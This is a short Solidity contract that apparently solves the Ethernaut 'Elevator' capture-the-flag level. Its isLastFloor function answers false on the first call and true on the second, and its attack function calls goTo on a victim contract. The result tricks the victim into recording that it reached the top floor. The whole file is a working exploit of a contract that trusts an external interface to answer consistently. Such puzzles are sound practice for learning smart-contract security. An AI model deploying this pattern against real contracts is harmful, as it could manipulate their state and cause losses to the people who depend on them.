pragma solidity 0.8.0;

interface IElevator {
    function goTo(uint _floor) external;
}

contract Building {
    bool secondCall = false;
    
    function isLastFloor(uint floor) external returns (bool) {
        if (!secondCall) {
            secondCall = true;
            return false;
        } else {
            return true;
        }
    }

    function attack(address _victim) public {
        IElevator victim = IElevator(_victim);
        victim.goTo(5);
    }
}